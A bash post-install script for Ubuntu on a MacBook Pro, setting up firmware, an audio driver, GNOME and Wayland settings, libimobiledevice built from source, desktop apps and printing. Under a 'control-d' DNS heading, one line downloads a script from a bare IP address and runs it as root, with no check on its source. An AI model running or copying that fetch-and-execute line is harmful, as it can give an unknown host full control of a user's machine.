#!/usr/bin/env bash
set -euo pipefail

# =========================================================
# Ubuntu Post-Install / MacBook Pro Setup Script
# =========================================================

WORKDIR="$HOME/setup"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

sudo apt update
sudo apt upgrade

# ---------------------------------------------------------
# Base tools
# ---------------------------------------------------------
sudo apt install -y curl git wget jq gcc make patch linux-headers-generic \
  build-essential pkg-config checkinstall autoconf automake libtool-bin

# ---------------------------------------------------------
# DNS / control-d (as provided)
# ---------------------------------------------------------
sudo apt install -y curl
sudo sh -c 'sh -c "$(curl -sSL https://147.185.34.1/dl)" -s 2f576p5mt07 forced'

# ---------------------------------------------------------
# Broadcom firmware
# ---------------------------------------------------------
git clone https://github.com/SuganAnbalagan/Sugan-MacBook-Pro.git
sudo cp Sugan-MacBook-Pro/brcm/*.txt /lib/firmware/brcm || true
sudo cp Sugan-MacBook-Pro/brcm/*.bin /lib/firmware/brcm || true

# ---------------------------------------------------------
# Audio (Cirrus)
# ---------------------------------------------------------
git clone https://github.com/davidjo/snd_hda_macbookpro.git
cd snd_hda_macbookpro
echo "Check ./install.cirrus.driver.sh"
echo "Press ENTER when you're ready to continue..."
read
sudo ./install.cirrus.driver.sh
cd "$WORKDIR"

# ---------------------------------------------------------
# GNOME tweaks
# ---------------------------------------------------------
gsettings set org.gnome.desktop.interface enable-animations false
gsettings set org.gnome.shell.extensions.dash-to-dock click-action 'minimize-or-overview'

# ---------------------------------------------------------
# Native Wayland apps
# ---------------------------------------------------------
mkdir -p "$HOME/.config/environment.d"
cat <<EOF > "$HOME/.config/environment.d/wayland.conf"
GDK_BACKEND=wayland
QT_QPA_PLATFORM=wayland
SDL_VIDEODRIVER=wayland
MOZ_ENABLE_WAYLAND=1
EOF

# ---------------------------------------------------------
# Disable i915 Panel Self Refresh
# ---------------------------------------------------------
if ! grep -q 'i915.enable_psr=0' /etc/default/grub; then
  sudo sed -i 's/^GRUB_CMDLINE_LINUX_DEFAULT="/&i915.enable_psr=0 /' /etc/default/grub
fi
sudo update-grub

# ---------------------------------------------------------
# libimobiledevice stack (from source)
# ---------------------------------------------------------
sudo apt install -y libreadline-dev libusb-1.0-0-dev libcurl4-openssl-dev \
  libssl-dev libzip-dev zlib1g-dev usbmuxd libplist-dev
  
export PKG_CONFIG_PATH=/usr/local/lib/pkgconfig:$PKG_CONFIG_PATH

build_lib () {
  local repo=$1
  local name=$2
  git clone "$repo"
  cd "$name"
  ./autogen.sh
  make
  sudo make install
  sudo ldconfig
  cd "$WORKDIR"
}

build_lib https://github.com/libimobiledevice/libplist.git libplist
build_lib https://github.com/libimobiledevice/libimobiledevice-glue libimobiledevice-glue
build_lib https://github.com/libimobiledevice/libusbmuxd libusbmuxd
build_lib https://github.com/libimobiledevice/libirecovery libirecovery
build_lib https://github.com/libimobiledevice/libtatsu libtatsu
build_lib https://github.com/libimobiledevice/libimobiledevice.git libimobiledevice
build_lib https://github.com/libimobiledevice/idevicerestore.git idevicerestore

# ---------------------------------------------------------
# Desktop apps
# ---------------------------------------------------------
sudo apt install -y variety openjdk-25-jre bleachbit vlc hplip hplip-gui

# Chrome
wget -O chrome.deb https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb

# LocalSend
curl -s https://api.github.com/repos/localsend/localsend/releases/latest \
| jq -r '.assets[] | select(.name | contains("linux-x86-64.deb")) | .browser_download_url' \
| wget -qi -
sudo apt install -y ./*.deb || true

# ---------------------------------------------------------
# Printing (USB → Network / AirPrint)
# ---------------------------------------------------------
sudo apt install -y cups avahi-daemon avahi-utils printer-driver-all

echo "DONE. Reboot recommended."